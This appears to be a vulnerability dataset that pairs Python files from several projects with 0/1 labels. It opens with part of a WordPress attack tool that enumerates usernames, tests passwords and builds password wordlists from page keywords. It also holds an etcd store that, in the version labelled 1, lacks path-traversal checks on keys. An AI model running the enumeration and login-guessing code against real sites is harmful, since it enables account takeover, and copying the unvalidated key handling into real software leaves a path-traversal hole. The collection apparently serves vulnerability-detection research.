        """"""Request an URL with a given parameters and proxy

        url    -- URL to request
        params -- dictionary with POST variables
        cache  -- True if you want request to be cached and get a cached version of the request
        data   -- If false, return request object, else return data. Cached data must be retrived with data=True
        """"""
        if cache and data and self._cache.has_key(url) and len(params) is 0:
            self.logger.debug(""Cached %s %s"", url, params)
            return self._cache[url]

        request = urllib2.Request(url)
        request.add_header(""User-agent"", ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1"")
        if self._proxy:
            proxy_handler = urllib2.ProxyHandler({'http': self._proxy})
            opener = urllib2.build_opener(proxy_handler)
        else:
            opener = urllib2.build_opener()
        self.logger.debug(""Requesting %s %s"", url, params)
        try:
            response = opener.open(request, urllib.urlencode(params))
            response_data = response.read()
        except urllib2.HTTPError:
            return False

        if cache and data and len(params) is 0:
            self._cache[url] = response_data

        if data:
            return response_data

        return response


    # WordPress specific methods

    def login(self, username, password):
        """"""Try to login into WordPress and see in the returned data contains login errors

        username -- Wordpress username
        password -- Password for the supplied username
        """"""
        data = self.request(self._login_url, [('log', username), ('pwd', password)])
        if data:
            if ""ERROR"" in data or ""Error"" in data or ""login_error"" in data or ""incorrect"" in data.lower():
                return False
            return True
        return False

    def check_username(self, username):
        """"""Try to login into WordPress and check in the returned data contains username errors

        username -- Wordpress username
        """"""
        data = self.request(self._login_url, [('log', username), ('pwd', str(randint(1, 9999999)))])
        if data:
            if ""ERROR"" in data or ""Error"" in data or ""login_error"" in data:
                if ""usuario es incorrecto"" in data or 'usuario no' in data or ""Invalid username"" in data:
                    return False
                return True
        return False

    def find_username(self, url=False):
        """"""Try to find a suitable username searching for common strings used in templates that refers to authors of blog posts

        url   -- Any URL in the blog that can contain author references
        """"""
        if url:
            data =  self.request(url, cache=True)
        else:
            data =  self.request(self._base_url, cache=True)
        username = None

        regexps = [
            '/author/(.*)""',
            '/author/(.*?)/feed',
            'entries of (.*)""',
            'by (.*) Feed""',
            '(<!-- by (.*?) -->)',
            'View all posts by (.*)""',
        ]

        while username is None and len(regexps):
            regexp = regexps.pop()
            match = re.search(regexp, data, re.IGNORECASE)
            if match:
                username = match.group(1)
                # self.logger.debug(""regexp %s marched %s"", regexp, username) # uncoment to debug regexps

        if username:
            username = username.strip().replace(""/"","""")
            self.logger.debug(""Possible username %s (by content)"", username)
            return username
        else:
            return False

    def enumerate_usernames(self, gap_tolerance=0):
        """"""Enumerate usernames

        Enumerate usernames using TALSOFT-2011-0526 advisory (http://seclists.org/fulldisclosure/2011/May/493) present in
        WordPress > 3.2-beta2, if no redirect is done try to match username from title of the user's archive page or page content.

        gap_tolerance -- Tolerance for user id gaps in the user id sequence (this gaps are present when users are deleted and new users created)
        """"""
        uid = 0
        usernames = []
        gaps = 0
        while gaps <= gap_tolerance:
            try:
                uid = uid + 1
                url = self._base_url+""?author=""+str(uid)
                request = urllib2.Request(url)
                request.add_header(""User-agent"", ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1"")
                if self._proxy:
                    proxy_handler = urllib2.ProxyHandler({""http"": self._proxy})
                    opener = urllib2.build_opener(proxy_handler)
                else:
                    opener = urllib2.build_opener()
                self.logger.debug(""Requesting %s"", url)
                response = opener.open(request)
                data = response.read()
                self._cache[url] = data     # save response in cache
                parsed_response_url = urlparse(response.geturl())
                response_path = parsed_response_url.path
                # Check for author in redirection
                if 'author' in response_path:
                    # A redirect was made and the username is exposed. The username is the last part of the
                    # response_path (sometimes the response path can contain a trailing slash)
                    if response_path[-1] is ""/"":
                        username = response_path.split(""/"")[-2]
                    else:
                        username = response_path.split(""/"")[-1]
                    self.logger.debug(""Possible username %s (by redirect)"", username)
                    usernames.append(username)
                    redirect = True
                    gaps = 0

                # Check for author in title
                username_title = self.get_user_from_title(data)
                if username_title and username_title not in usernames:
                    usernames.append(username_title)
                    gaps = 0

                # Check for author in content
                username_content = self.find_username(url)
                if username_content and username_content not in usernames:
                    usernames.append(username_content)
                    gaps = 0

            except urllib2.HTTPError, e:
                self.logger.debug(e)
                gaps += 1

            gaps += 1

        return [user for user in usernames if self.check_username(user)]

    def get_user_from_title(self, content):
        """"""Fetch the contents of the <title> tag and returns a username (usually, the first word)

        content    -- html content
        last_title -- last title found
        """"""
        # There was no redirection but the user ID seems to exists (because not 404) so we will
        # try to find the username as the first word in the title
        title_search = re.search(""<title>(.*)</title>"", content, re.IGNORECASE)
        if title_search:
            title =  title_search.group(1)
            # If the title is the same than the last title requested, or empty, there are no new users
            if (self._cache.has_key('title') and title == self._cache['title']) or ' ' not in title:
                return False
            else:
                self._cache['title'] = title
                username = title.split()[0]
                self.logger.debug(""Possible username %s (by title)"", username)
                return username
        else:
                return False

    def find_keywords_in_url(self, min_keyword_len=3, min_frequency=2, ignore_with=False):
        """"""Try to find relevant keywords within the given URL, keywords will be used in the password wordlist

        min_keyword_len -- Filter keywords that doesn't have this minimum length
        min_frequency   -- Filter keywords number of times than a keyword appears within the content
        ignore_with     -- Ignore words that contains any characters in this list
        """"""
        data =  self.request(self._base_url, cache=True)
        keywords = []

        # get keywords from title
        title = re.search('<title>(.*)</title>', data, re.IGNORECASE)
        if title:
            title = title.group(1)
            [keywords.insert(0, kw.lower()) for kw in title.split("" "")][:-1]

        # get keywords from url content
        [keywords.append(k.strip()) for k in get_keywords(re.sub(""<.*?>"", """", data), min_keyword_len, min_frequency)]

        # filter keywords
        keywords = rm_duplicates([k.lower().strip().strip("","").strip(""?"").strip('""') for k in keywords if len(k) > min_keyword_len])    # min leght
        if ignore_with and len(ignore_with) > 0:        # ignore keywords with certain characters
            for keyword in keywords[:]:
                for i in ignore_with:
                    if i in keyword:
                        keywords.remove(keyword)
                        break

        return keywords

    def check_loginlockdown(self):
        """"""Check if ""Login LockDown"" plugin is active (Alip Aswalid)

        url   -- Login form URL
        proxy -- URL for a HTTP Proxy
        """"""
        data = self.request(self._login_url, cache=True)
        if data and ""lockdown"" in data.lower():
            return True
        else:
            return False

    def check_plugin(self, plugin):
        """"""Try to fetch WordPress version from ""generator"" meta tag in main page

        return - WordPress version or false if not found
        """"""
        url = self._base_url+""wp-content/plugins/""+plugin
        data = self.request(url)
        if data is not False:
            return True
        else:
            return False

    def find_plugins(self, url=False):
        """"""Try to find plugin names from content

        url   -- Any URL in the blog that can contain plugin paths
        """"""
        if url:
            data =  self.request(url, cache=True)
        else:
            data =  self.request(self._base_url, cache=True)

        plugins = re.findall(r""wp-content/plugins/(.*)/.*\.*\?.*[\'|\""]\w"", data, re.IGNORECASE)

        if len(plugins):
            self.logger.debug(""Possible plugins %s present"", plugins)
            return plugins
        else:
            return False

    def fingerprint(self):
        """"""Try to fetch WordPress version from ""generator"" meta tag in main page

        return - WordPress version or false if not found
        """"""
        data = self.request(self._base_url, cache=True)
        m = re.search('<meta name=""generator"" content=""[Ww]ord[Pp]ress (\d\.\d\.?\d?)"" />', data)
        if m:
            self._version = m.group(1)
            return self._version
        else:
            return False
/n/n/n",1
80,54189d96975f64ba1f7a751f1c4fe5ff689bb77a,"circuits/web/dispatchers/dispatcher.py/n/n# Module:   dispatcher
# Date:     13th September 2007
# Author:   James Mills, prologic at shortcircuit dot net dot au

""""""Dispatcher

This module implements a basic URL to Channel dispatcher.
This is the default dispatcher used by circuits.web
""""""

try:
    from urllib import quote, unquote
except ImportError:
    from urllib.parse import quote, unquote  # NOQA

from circuits.six import text_type

from circuits import handler, BaseComponent, Event

from circuits.web.utils import parse_qs
from circuits.web.events import response
from circuits.web.errors import httperror
from circuits.web.processors import process
from circuits.web.controllers import BaseController


class Dispatcher(BaseComponent):

    channel = ""web""

    def __init__(self, **kwargs):
        super(Dispatcher, self).__init__(**kwargs)

        self.paths = dict()

    def resolve_path(self, paths, parts):

        def rebuild_path(url_parts):
            return '/%s' % '/'.join(url_parts)

        left_over = []

        while parts:
            if rebuild_path(parts) in self.paths:
                yield rebuild_path(parts), left_over
            left_over.insert(0, parts.pop())

        if '/' in self.paths:
            yield '/', left_over

    def resolve_methods(self, parts):
        if parts:
            method = parts[0]
            vpath = parts[1:]
            yield method, vpath

        yield 'index', parts

    def find_handler(self, req):
        def get_handlers(path, method):
            component = self.paths[path]
            return component._handlers.get(method, None)

        def accepts_vpath(handlers, vpath):
            args_no = len(vpath)
            return all(len(h.args) == args_no or h.varargs or (h.defaults is not None and args_no <= len(h.defaults)) for h in handlers)

        # Split /hello/world to ['hello', 'world']
        starting_parts = [x for x in req.path.strip(""/"").split(""/"") if x]

        for path, parts in self.resolve_path(self.paths, starting_parts):
            if get_handlers(path, req.method):
                return req.method, path, parts

            for method, vpath in self.resolve_methods(parts):
                handlers = get_handlers(path, method)
                if handlers and (not vpath or accepts_vpath(handlers, vpath)):
                    req.index = (method == 'index')
                    return method, path, vpath
                else:
                    method, vpath = ""index"", [method] + vpath
                    handlers = get_handlers(path, method)
                    if handlers and (not vpath or accepts_vpath(handlers, vpath)):
                        req.index = True
                        return method, path, vpath

        return None, None, None

    @handler(""registered"", channel=""*"")
    def _on_registered(self, component, manager):
        if (isinstance(component, BaseController) and component.channel not
                in self.paths):
            self.paths[component.channel] = component

    @handler(""unregistered"", channel=""*"")
    def _on_unregistered(self, component, manager):
        if (isinstance(component, BaseController) and component.channel in
                self.paths):
            del self.paths[component.channel]

    @handler(""request"", priority=0.1)
    def _on_request(self, event, req, res, peer_cert=None):
        if peer_cert:
            event.peer_cert = peer_cert

        name, channel, vpath = self.find_handler(req)

        if name is not None and channel is not None:
            event.kwargs = parse_qs(req.qs)
            process(req, event.kwargs)

            if vpath:
                event.args += tuple(vpath)

            if isinstance(name, text_type):
                name = str(name)

            return self.fire(
                Event.create(
                    name, *event.args, **event.kwargs
                ),
                channel
            )

    @handler(""request_value_changed"")
    def _on_request_value_changed(self, value):
        if value.handled:
            return

        req, res = value.event.args[:2]
        if value.result and not value.errors:
            res.body = value.value
            self.fire(response(res))
        elif value.promise:
            value.event.notify = True
        else:
            # This possibly never occurs.
            self.fire(httperror(req, res, error=value.value))
/n/n/ntests/web/test_core.py/n/n#!/usr/bin/env python

import pytest


from circuits.web import Controller

from .helpers import urlencode, urlopen, HTTPError


class Root(Controller):

    def index(self):
        return ""Hello World!""

    def test_args(self, *args, **kwargs):
        return ""{0}\n{1}"".format(repr(args), repr(kwargs))

    def test_default_args(self, a=None, b=None):
        return ""a={0}\nb={1}"".format(repr(a), repr(b))

    def test_redirect(self):
        return self.redirect(""/"")

    def test_forbidden(self):
        return self.forbidden()

    def test_notfound(self):
        return self.notfound()

    def test_failure(self):
        raise Exception()


def test_root(webapp):
    f = urlopen(webapp.server.http.base)
    s = f.read()
    assert s == b""Hello World!""


def test_404(webapp):
    try:
        urlopen(""%s/foo"" % webapp.server.http.base)
    except HTTPError as e:
        assert e.code == 404
        assert e.msg == ""Not Found""
    else:
        assert False


def test_args(webapp):
    args = (""1"", ""2"", ""3"")
    kwargs = {""1"": ""one"", ""2"": ""two"", ""3"": ""three""}
    url = ""%s/test_args/%s"" % (webapp.server.http.base, ""/"".join(args))
    data = urlencode(kwargs).encode('utf-8')
    f = urlopen(url, data)
    data = f.read().split(b""\n"")
    assert eval(data[0]) == args
    assert eval(data[1]) == kwargs


@pytest.mark.parametrize(""data,expected"", [
    (([""1""], {}),           ""a='1'\nb=None""),
    (([""1"", ""2""], {}),       ""a='1'\nb='2'""),
    (([""1""], {""b"": ""2""}),   ""a='1'\nb=u'2'""),
])
def test_default_args(webapp, data, expected):
    args, kwargs = data
    url = ""%s/test_default_args/%s"" % (webapp.server.http.base, ""/"".join(args))
    data = urlencode(kwargs).encode('utf-8')
    f = urlopen(url, data)
    assert f.read() == expected


def test_redirect(webapp):
    f = urlopen(""%s/test_redirect"" % webapp.server.http.base)
    s = f.read()
    assert s == b""Hello World!""


def test_forbidden(webapp):
    try:
        urlopen(""%s/test_forbidden"" % webapp.server.http.base)
    except HTTPError as e:
        assert e.code == 403
        assert e.msg == ""Forbidden""
    else:
        assert False


def test_notfound(webapp):
    try:
        urlopen(""%s/test_notfound"" % webapp.server.http.base)
    except HTTPError as e:
        assert e.code == 404
        assert e.msg == ""Not Found""
    else:
        assert False


def test_failure(webapp):
    try:
        urlopen(""%s/test_failure"" % webapp.server.http.base)
    except HTTPError as e:
        assert e.code == 500
    else:
        assert False
/n/n/n",0
81,54189d96975f64ba1f7a751f1c4fe5ff689bb77a,"/circuits/web/dispatchers/dispatcher.py/n/n# Module:   dispatcher
# Date:     13th September 2007
# Author:   James Mills, prologic at shortcircuit dot net dot au

""""""Dispatcher

This module implements a basic URL to Channel dispatcher.
This is the default dispatcher used by circuits.web
""""""

try:
    from urllib import quote, unquote
except ImportError:
    from urllib.parse import quote, unquote  # NOQA

from circuits.six import text_type

from circuits import handler, BaseComponent, Event

from circuits.web.utils import parse_qs
from circuits.web.events import response
from circuits.web.errors import httperror
from circuits.web.processors import process
from circuits.web.controllers import BaseController


class Dispatcher(BaseComponent):

    channel = ""web""

    def __init__(self, **kwargs):
        super(Dispatcher, self).__init__(**kwargs)

        self.paths = dict()

    def resolve_path(self, paths, parts):

        def rebuild_path(url_parts):
            return '/%s' % '/'.join(url_parts)

        left_over = []

        while parts:
            if rebuild_path(parts) in self.paths:
                yield rebuild_path(parts), left_over
            left_over.insert(0, parts.pop())

        if '/' in self.paths:
            yield '/', left_over

    def resolve_methods(self, parts):
        if parts:
            method = parts[0]
            vpath = parts[1:]
            yield method, vpath

        yield 'index', parts

    def find_handler(self, req):
        def get_handlers(path, method):
            component = self.paths[path]
            return component._handlers.get(method, None)

        def accepts_vpath(handlers, vpath):
            args_no = len(vpath)
            return all(len(h.args) == args_no or h.varargs for h in handlers)

        # Split /hello/world to ['hello', 'world']
        starting_parts = [x for x in req.path.strip(""/"").split(""/"") if x]

        for path, parts in self.resolve_path(self.paths, starting_parts):
            if get_handlers(path, req.method):
                return req.method, path, parts

            for method, vpath in self.resolve_methods(parts):
                handlers = get_handlers(path, method)
                if handlers and (not vpath or accepts_vpath(handlers, vpath)):
                    req.index = (method == 'index')
                    return method, path, vpath

        return None, None, None

    @handler(""registered"", channel=""*"")
    def _on_registered(self, component, manager):
        if (isinstance(component, BaseController) and component.channel not
                in self.paths):
            self.paths[component.channel] = component

    @handler(""unregistered"", channel=""*"")
    def _on_unregistered(self, component, manager):
        if (isinstance(component, BaseController) and component.channel in
                self.paths):
            del self.paths[component.channel]

    @handler(""request"", priority=0.1)
    def _on_request(self, event, req, res, peer_cert=None):
        if peer_cert:
            event.peer_cert = peer_cert

        name, channel, vpath = self.find_handler(req)

        if name is not None and channel is not None:
            event.kwargs = parse_qs(req.qs)
            process(req, event.kwargs)

            if vpath:
                event.args += tuple(vpath)

            if isinstance(name, text_type):
                name = str(name)

            return self.fire(
                Event.create(
                    name, *event.args, **event.kwargs
                ),
                channel
            )

    @handler(""request_value_changed"")
    def _on_request_value_changed(self, value):
        if value.handled:
            return

        req, res = value.event.args[:2]
        if value.result and not value.errors:
            res.body = value.value
            self.fire(response(res))
        elif value.promise:
            value.event.notify = True
        else:
            # This possibly never occurs.
            self.fire(httperror(req, res, error=value.value))
/n/n/n",1
82,785fc87f38b4811bc4ce43a0a9b2267ee7d500b4,"custodia/store/etcdstore.py/n/n# Copyright (C) 2015  Custodia Project Contributors - see LICENSE file

from __future__ import print_function

import sys

import etcd

from custodia.store.interface import CSStore, CSStoreError, CSStoreExists


def log_error(error):
    print(error, file=sys.stderr)


class EtcdStore(CSStore):

    def __init__(self, config):
        self.server = config.get('etcd_server', '127.0.0.1')
        self.port = int(config.get('etcd_port', 4001))
        self.namespace = config.get('namespace', ""/custodia"")

        # Initialize the DB by trying to create the default table
        try:
            self.etcd = etcd.Client(self.server, self.port)
            self.etcd.write(self.namespace, None, dir=True)
        except etcd.EtcdNotFile:
            # Already exists
            pass
        except etcd.EtcdException as err:
            log_error(""Error creating namespace %s: [%r]"" % (self.namespace,
                                                             repr(err)))
            raise CSStoreError('Error occurred while trying to init db')

    def _absolute_key(self, key):
        """"""Get absolute path to key and validate key""""""
        if '//' in key:
            raise ValueError(""Invalid empty components in key '%s'"" % key)
        parts = key.split('/')
        if set(parts).intersection({'.', '..'}):
            raise ValueError(""Invalid relative components in key '%s'"" % key)
        return '/'.join([self.namespace] + parts).replace('//', '/')

    def get(self, key):
        try:
            result = self.etcd.get(self._absolute_key(key))
        except etcd.EtcdException as err:
            log_error(""Error fetching key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to get key')
        return result.value

    def set(self, key, value, replace=False):
        path = self._absolute_key(key)
        try:
            self.etcd.write(path, value, prevExist=replace)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def span(self, key):
        path = self._absolute_key(key)
        try:
            self.etcd.write(path, None, dir=True, prevExist=False)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def list(self, keyfilter='/'):
        path = self._absolute_key(keyfilter)
        if path != '/':
            path = path.rstrip('/')
        try:
            result = self.etcd.read(path, recursive=True)
        except etcd.EtcdKeyNotFound:
            return None
        except etcd.EtcdException as err:
            log_error(""Error listing %s: [%r]"" % (keyfilter, repr(err)))
            raise CSStoreError('Error occurred while trying to list keys')

        value = set()
        for entry in result.get_subtree():
            if entry.key == path:
                continue
            name = entry.key[len(path):]
            if entry.dir and not name.endswith('/'):
                name += '/'
            value.add(name.lstrip('/'))
        return sorted(value)

    def cut(self, key):
        try:
            self.etcd.delete(self._absolute_key(key))
        except etcd.EtcdKeyNotFound:
            return False
        except etcd.EtcdException as err:
            log_error(""Error removing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to cut key')
        return True
/n/n/n",0
83,785fc87f38b4811bc4ce43a0a9b2267ee7d500b4,"/custodia/store/etcdstore.py/n/n# Copyright (C) 2015  Custodia Project Contributors - see LICENSE file

from __future__ import print_function

import os
import sys

import etcd

from custodia.store.interface import CSStore, CSStoreError, CSStoreExists


def log_error(error):
    print(error, file=sys.stderr)


class EtcdStore(CSStore):

    def __init__(self, config):
        self.server = config.get('etcd_server', '127.0.0.1')
        self.port = int(config.get('etcd_port', 4001))
        self.namespace = config.get('namespace', ""/custodia"")

        # Initialize the DB by trying to create the default table
        try:
            self.etcd = etcd.Client(self.server, self.port)
            self.etcd.write(self.namespace, None, dir=True)
        except etcd.EtcdNotFile:
            # Already exists
            pass
        except etcd.EtcdException as err:
            log_error(""Error creating namespace %s: [%r]"" % (self.namespace,
                                                             repr(err)))
            raise CSStoreError('Error occurred while trying to init db')

    def get(self, key):
        try:
            result = self.etcd.get(os.path.join(self.namespace, key))
        except etcd.EtcdException as err:
            log_error(""Error fetching key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to get key')
        return result.value

    def set(self, key, value, replace=False):
        path = os.path.join(self.namespace, key)
        try:
            self.etcd.write(path, value, prevExist=replace)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def span(self, key):
        path = os.path.join(self.namespace, key)
        try:
            self.etcd.write(path, None, dir=True, prevExist=False)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def list(self, keyfilter='/'):
        path = os.path.join(self.namespace, keyfilter)
        if path != '/':
            path = path.rstrip('/')
        try:
            result = self.etcd.read(path, recursive=True)
        except etcd.EtcdKeyNotFound:
            return None
        except etcd.EtcdException as err:
            log_error(""Error listing %s: [%r]"" % (keyfilter, repr(err)))
            raise CSStoreError('Error occurred while trying to list keys')

        value = set()
        for entry in result.get_subtree():
            if entry.key == path:
                continue
            name = entry.key[len(path):]
            if entry.dir and not name.endswith('/'):
                name += '/'
            value.add(name.lstrip('/'))
        return sorted(value)

    def cut(self, key):
        try:
            self.etcd.delete(os.path.join(self.namespace, key))
        except etcd.EtcdKeyNotFound:
            return False
        except etcd.EtcdException as err:
            log_error(""Error removing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to cut key')
        return True
/n/n/n",1
84,91855bdc8c0dcb933821be0fdb356cc43ffce585,"reframe/frontend/dependency.py/n/n#
# Test case graph functionality
#

import collections
import itertools

import reframe as rfm
from reframe.core.exceptions import DependencyError


def build_deps(cases):
    """"""Build dependency graph from test cases.

    The graph is represented as an adjacency list in a Python dictionary
    holding test cases. The dependency information is also encoded inside each
    test cases.
    """"""

    # Index cases for quick access
    cases_by_part = {}
    cases_revmap = {}
    for c in cases:
        cname = c.check.name
        pname = c.partition.fullname
        ename = c.environ.name
        cases_by_part.setdefault((cname, pname), [])
        cases_revmap.setdefault((cname, pname, ename), None)
        cases_by_part[cname, pname].append(c)
        cases_revmap[cname, pname, ename] = c

    def resolve_dep(target, from_map, *args):
        errmsg = 'could not resolve dependency: %s' % target
        try:
            ret = from_map[args]
        except KeyError:
            raise DependencyError(errmsg)
        else:
            if not ret:
                raise DependencyError(errmsg)

            return ret

    # NOTE on variable names
    #
    # c stands for check or case depending on the context
    # p stands for partition
    # e stands for environment
    # t stands for target

    graph = {}
    for c in cases:
        graph[c] = c.deps
        cname = c.check.name
        pname = c.partition.fullname
        ename = c.environ.name
        for dep in c.check.user_deps():
            tname, how, subdeps = dep
            if how == rfm.DEPEND_FULLY:
                c.deps.extend(resolve_dep(c, cases_by_part, tname, pname))
            elif how == rfm.DEPEND_BY_ENV:
                c.deps.append(resolve_dep(c, cases_revmap,
                                          tname, pname, ename))
            elif how == rfm.DEPEND_EXACT:
                for env, tenvs in subdeps.items():
                    if env != ename:
                        continue

                    for te in tenvs:
                        c.deps.append(resolve_dep(c, cases_revmap,
                                                  tname, pname, te))

    return graph


def print_deps(graph):
    for c, deps in graph.items():
        print(c, '->', deps)


def validate_deps(graph):
    """"""Validate dependency graph.""""""

    # Reduce test case graph to a test name only graph; this disallows
    # pseudo-dependencies as follows:
    #
    # (t0, e1) -> (t1, e1)
    # (t1, e0) -> (t0, e0)
    #
    # This reduction step will result in a graph description with duplicate
    # entries in the adjacency list; this is not a problem, cos they will be
    # filtered out during the DFS traversal below.
    test_graph = {}
    for case, deps in graph.items():
        test_deps = [d.check.name for d in deps]
        try:
            test_graph[case.check.name] += test_deps
        except KeyError:
            test_graph[case.check.name] = test_deps

    # Check for cyclic dependencies in the test name graph
    visited = set()
    sources = set(test_graph.keys())
    path = []

    # Since graph may comprise multiple not connected subgraphs, we search for
    # cycles starting from all possible sources
    while sources:
        unvisited = [(sources.pop(), None)]
        while unvisited:
            node, parent = unvisited.pop()
            while path and path[-1] != parent:
                path.pop()

            adjacent = reversed(test_graph[node])
            path.append(node)
            for n in adjacent:
                if n in path:
                    cycle_str = '->'.join(path + [n])
                    raise DependencyError(
                        'found cyclic dependency between tests: ' + cycle_str)

                if n not in visited:
                    unvisited.append((n, node))

            visited.add(node)

        sources -= visited
/n/n/nunittests/test_policies.py/n/nimport collections
import os
import pytest
import tempfile
import unittest

import reframe as rfm
import reframe.core.runtime as rt
import reframe.frontend.dependency as dependency
import reframe.frontend.executors as executors
import reframe.frontend.executors.policies as policies
import reframe.utility.os_ext as os_ext
from reframe.core.exceptions import DependencyError, JobNotStartedError
from reframe.frontend.loader import RegressionCheckLoader
import unittests.fixtures as fixtures
from unittests.resources.checks.hellocheck import HelloTest
from unittests.resources.checks.frontend_checks import (
    BadSetupCheck,
    BadSetupCheckEarly,
    KeyboardInterruptCheck,
    RetriesCheck,
    SleepCheck,
    SleepCheckPollFail,
    SleepCheckPollFailLate,
    SystemExitCheck,
)


class TestSerialExecutionPolicy(unittest.TestCase):
    def setUp(self):
        self.loader = RegressionCheckLoader(['unittests/resources/checks'],
                                            ignore_conflicts=True)

        # Setup the runner
        self.runner = executors.Runner(policies.SerialExecutionPolicy())
        self.checks = self.loader.load_all()

        # Set runtime prefix
        rt.runtime().resources.prefix = tempfile.mkdtemp(dir='unittests')

        # Reset current_run
        rt.runtime()._current_run = 0

    def tearDown(self):
        os_ext.rmtree(rt.runtime().resources.prefix)

    def runall(self, checks, *args, **kwargs):
        cases = executors.generate_testcases(checks, *args, **kwargs)
        self.runner.runall(cases)

    def _num_failures_stage(self, stage):
        stats = self.runner.stats
        return len([t for t in stats.failures() if t.failed_stage == stage])

    def assert_all_dead(self):
        stats = self.runner.stats
        for t in self.runner.stats.tasks():
            try:
                finished = t.check.poll()
            except JobNotStartedError:
                finished = True

            self.assertTrue(finished)

    def test_runall(self):
        self.runall(self.checks)

        stats = self.runner.stats
        self.assertEqual(7, stats.num_cases())
        self.assertEqual(4, len(stats.failures()))
        self.assertEqual(2, self._num_failures_stage('setup'))
        self.assertEqual(1, self._num_failures_stage('sanity'))
        self.assertEqual(1, self._num_failures_stage('performance'))

    def test_runall_skip_system_check(self):
        self.runall(self.checks, skip_system_check=True)

        stats = self.runner.stats
        self.assertEqual(8, stats.num_cases())
        self.assertEqual(4, len(stats.failures()))
        self.assertEqual(2, self._num_failures_stage('setup'))
        self.assertEqual(1, self._num_failures_stage('sanity'))
        self.assertEqual(1, self._num_failures_stage('performance'))

    def test_runall_skip_prgenv_check(self):
        self.runall(self.checks, skip_environ_check=True)

        stats = self.runner.stats
        self.assertEqual(8, stats.num_cases())
        self.assertEqual(4, len(stats.failures()))
        self.assertEqual(2, self._num_failures_stage('setup'))
        self.assertEqual(1, self._num_failures_stage('sanity'))
        self.assertEqual(1, self._num_failures_stage('performance'))

    def test_runall_skip_sanity_check(self):
        self.runner.policy.skip_sanity_check = True
        self.runall(self.checks)

        stats = self.runner.stats
        self.assertEqual(7, stats.num_cases())
        self.assertEqual(3, len(stats.failures()))
        self.assertEqual(2, self._num_failures_stage('setup'))
        self.assertEqual(0, self._num_failures_stage('sanity'))
        self.assertEqual(1, self._num_failures_stage('performance'))

    def test_runall_skip_performance_check(self):
        self.runner.policy.skip_performance_check = True
        self.runall(self.checks)

        stats = self.runner.stats
        self.assertEqual(7, stats.num_cases())
        self.assertEqual(3, len(stats.failures()))
        self.assertEqual(2, self._num_failures_stage('setup'))
        self.assertEqual(1, self._num_failures_stage('sanity'))
        self.assertEqual(0, self._num_failures_stage('performance'))

    def test_strict_performance_check(self):
        self.runner.policy.strict_check = True
        self.runall(self.checks)

        stats = self.runner.stats
        self.assertEqual(7, stats.num_cases())
        self.assertEqual(5, len(stats.failures()))
        self.assertEqual(2, self._num_failures_stage('setup'))
        self.assertEqual(1, self._num_failures_stage('sanity'))
        self.assertEqual(2, self._num_failures_stage('performance'))

    def test_force_local_execution(self):
        self.runner.policy.force_local = True
        self.runall([HelloTest()])
        stats = self.runner.stats
        for t in stats.tasks():
            self.assertTrue(t.check.local)

    def test_kbd_interrupt_within_test(self):
        check = KeyboardInterruptCheck()
        self.assertRaises(KeyboardInterrupt, self.runall, [check])
        stats = self.runner.stats
        self.assertEqual(1, len(stats.failures()))
        self.assert_all_dead()

    def test_system_exit_within_test(self):
        check = SystemExitCheck()

        # This should not raise and should not exit
        self.runall([check])
        stats = self.runner.stats
        self.assertEqual(1, len(stats.failures()))

    def test_retries_bad_check(self):
        max_retries = 2
        checks = [BadSetupCheck(), BadSetupCheckEarly()]
        self.runner._max_retries = max_retries
        self.runall(checks)

        # Ensure that the test was retried #max_retries times and failed.
        self.assertEqual(2, self.runner.stats.num_cases())
        self.assertEqual(max_retries, rt.runtime().current_run)
        self.assertEqual(2, len(self.runner.stats.failures()))

        # Ensure that the report does not raise any exception.
        self.runner.stats.retry_report()

    def test_retries_good_check(self):
        max_retries = 2
        checks = [HelloTest()]
        self.runner._max_retries = max_retries
        self.runall(checks)

        # Ensure that the test passed without retries.
        self.assertEqual(1, self.runner.stats.num_cases())
        self.assertEqual(0, rt.runtime().current_run)
        self.assertEqual(0, len(self.runner.stats.failures()))

    def test_pass_in_retries(self):
        max_retries = 3
        run_to_pass = 2
        # Create a file containing the current_run; Run 0 will set it to 0,
        # run 1 to 1 and so on.
        with tempfile.NamedTemporaryFile(mode='wt', delete=False) as fp:
            fp.write('0\n')

        checks = [RetriesCheck(run_to_pass, fp.name)]
        self.runner._max_retries = max_retries
        self.runall(checks)

        # Ensure that the test passed after retries in run #run_to_pass.
        self.assertEqual(1, self.runner.stats.num_cases())
        self.assertEqual(1, len(self.runner.stats.failures(run=0)))
        self.assertEqual(run_to_pass, rt.runtime().current_run)
        self.assertEqual(0, len(self.runner.stats.failures()))
        os.remove(fp.name)


class TaskEventMonitor(executors.TaskEventListener):
    """"""Event listener for monitoring the execution of the asynchronous
    execution policy.

    We need to make sure two things for the async policy:

    1. The number of running tasks never exceed the max job size per partition.
    2. Given a set of regression tests with a reasonably long runtime, the
       execution policy must be able to reach the maximum concurrency. By
       reasonably long runtime, we mean that that the regression tests must run
       enough time, so as to allow the policy to execute all the tests until
       their ""run"" phase, before the first submitted test finishes.
    """"""

    def __init__(self):
        super().__init__()

        # timeline of num_tasks
        self.num_tasks = [0]
        self.tasks = []

    def on_task_run(self, task):
        super().on_task_run(task)
        last = self.num_tasks[-1]
        self.num_tasks.append(last + 1)
        self.tasks.append(task)

    def on_task_exit(self, task):
        last = self.num_tasks[-1]
        self.num_tasks.append(last - 1)

    def on_task_success(self, task):
        pass

    def on_task_failure(self, task):
        pass


class TestAsynchronousExecutionPolicy(TestSerialExecutionPolicy):
    def setUp(self):
        super().setUp()
